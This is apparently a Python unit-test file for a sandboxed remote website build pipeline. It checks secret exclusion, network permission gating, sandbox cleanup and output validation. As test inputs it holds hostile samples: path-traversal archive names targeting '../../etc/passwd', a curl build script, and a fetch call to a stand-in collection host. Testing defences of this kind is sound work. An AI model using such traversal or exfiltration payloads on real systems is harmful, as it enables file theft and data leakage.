import io
import json
import tempfile
import unittest
import zipfile
from pathlib import Path

from scripts.remote_e2b_web_build import (
    _extract_verified_output,
    build_and_preserve,
    source_bundle,
)


class Commands:
    def __init__(self, fail=False):
        self.calls = []
        self.fail = fail

    def run(self, command, timeout):
        self.calls.append((command, timeout))
        return type("Result", (), {"exit_code": 1 if self.fail else 0,
                                    "stderr": "synthetic failed build" if self.fail else ""})()


class FakeE2B:
    def __init__(self, output, fail=False):
        self.uploads = {}
        self.files = type("Files", (), {})()
        self.files.write = lambda name, data: self.uploads.__setitem__(name, data)
        self.files.read = lambda name, format: output
        self.commands = Commands(fail=fail)
        self.killed = False

    def kill(self):
        self.killed = True


def archive(**files):
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return out.getvalue()


class E2BWebBuildTests(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name)
        self.workspace = self.root / "workspace"
        self.workspace.mkdir()
        (self.workspace / "site").mkdir()
        (self.workspace / "site" / "index.html").write_text(
            "<!doctype html><html lang='pt-br'><title>Rosales Café</title><h1>Rosales Café</h1></html>",
            encoding="utf-8")
        self.deliveries = self.root / "deliveries"
        self.env = {
            "E2B_API_KEY": "synthetic-do-not-bill",
            "OLYMPUS_REMOTE_SANDBOX_AUTHORIZED": "1",
        }

    def test_static_source_bundle_ignores_secrets(self):
        (self.workspace / "site" / ".env").write_text("EXAMPLE_SECRET=must-stay-private")
        (self.workspace / "site" / "photo.jpg").write_bytes(b"123")
        with zipfile.ZipFile(io.BytesIO(source_bundle(self.workspace, "static"))) as zf:
            self.assertIn("site/index.html", zf.namelist())
            self.assertIn("site/photo.jpg", zf.namelist())
            self.assertNotIn("site/.env", zf.namelist())

    def test_verified_artifact_is_preserved_and_sandbox_killed(self):
        fake = FakeE2B(archive(**{"site/index.html": "<h1>Rosales Café</h1>"}))
        kwargs = []
        def factory(**options):
            kwargs.append(options)
            return fake
        result = build_and_preserve(self.workspace, "static", self.deliveries,
                                    "rosales-pilot-1", self.env, factory)
        self.assertEqual(result["status"], "BUILD_VERIFIED")
        self.assertFalse(result["model_inference_verified"])
        self.assertFalse(result["browser_verified"])
        self.assertTrue(fake.killed)
        self.assertFalse(kwargs[0]["allow_internet_access"])
        self.assertEqual(kwargs[0]["network"], {"allow_public_traffic": False})
        self.assertEqual(kwargs[0]["envs"], {})
        target = self.deliveries / "rosales-pilot-1"
        self.assertTrue((target / "site" / "index.html").is_file())
        manifest = json.loads((target / "manifest.json").read_text())
        self.assertEqual(manifest["files"][0]["path"], "index.html")
        self.assertIn("site/index.html",
                      zipfile.ZipFile(io.BytesIO(fake.uploads["/home/user/olympus-source.zip"])).namelist())

    def test_no_permission_no_remote_service_calls(self):
        called = []
        with self.assertRaisesRegex(PermissionError, "authorized"):
            build_and_preserve(self.workspace, "static", self.deliveries, "x",
                               {}, lambda **kw: called.append(kw))
        self.assertFalse(called)

    def test_react_requires_explicit_network_permission(self):
        for p in (self.workspace / "site").iterdir():
            p.unlink()
        (self.workspace / "site").rmdir()
        (self.workspace / "package.json").write_text(
            json.dumps({"scripts": {"build": "vite build"}}))
        (self.workspace / "package-lock.json").write_text("{}")
        (self.workspace / "index.html").write_text('<div id="root"></div>')
        (self.workspace / "src").mkdir()
        (self.workspace / "src" / "main.jsx").write_text("console.log('Rosales')")
        fake = FakeE2B(archive(**{"site/index.html": "<div id='root'>Rosales</div>"}))
        with self.assertRaisesRegex(PermissionError, "network usage"):
            build_and_preserve(self.workspace, "react", self.deliveries, "r1",
                                self.env, lambda **kw: fake)
        env = {**self.env, "OLYMPUS_REMOTE_BUILD_NETWORK_AUTHORIZED": "1"}
        result = build_and_preserve(self.workspace, "react", self.deliveries,
                                    "r1", env, lambda **kw: fake)
        self.assertEqual(result["status"], "BUILD_VERIFIED")
        commands = " ".join(command for command, _ in fake.commands.calls)
        self.assertIn("npm ci --ignore-scripts", commands)
        self.assertIn("npm run build", commands)

    def test_react_custom_build_script_rejected(self):
        (self.workspace / "package.json").write_text(
            json.dumps({"scripts": {"build": "curl https://example.com"}}))
        (self.workspace / "package-lock.json").write_text("{}")
        with self.assertRaisesRegex(ValueError, "vite build"):
            source_bundle(self.workspace, "react")

    def test_failing_build_does_not_preserve_output(self):
        fake = FakeE2B(b"", fail=True)
        with self.assertRaisesRegex(RuntimeError, "remote build command failed"):
            build_and_preserve(self.workspace, "static", self.deliveries,
                                "bad", self.env, lambda **kw: fake)
        self.assertTrue(fake.killed)
        self.assertFalse((self.deliveries / "bad").exists())

    def test_malicious_archive_entries_rejected(self):
        for name in ("../../etc/passwd", "site/../escape.html", "site/evil.exe"):
            with self.subTest(name=name):
                with tempfile.TemporaryDirectory() as temp:
                    with self.assertRaisesRegex(ValueError, "BLOCKED"):
                        _extract_verified_output(archive(**{name: "bad"}), temp)

    def test_validation_rejects_remote_javascript_and_preserves_nothing(self):
        fake = FakeE2B(archive(**{
            "site/index.html": "<h1>Rosales</h1>",
            "site/app.js": 'fetch("https://unexpected.example/collect")',
        }))
        with self.assertRaisesRegex(ValueError, "BLOCKED"):
            build_and_preserve(self.workspace, "static", self.deliveries,
                               "unsafe", self.env, lambda **kw: fake)
        self.assertTrue(fake.killed)
        self.assertFalse((self.deliveries / "unsafe").exists())


if __name__ == "__main__":
    unittest.main()
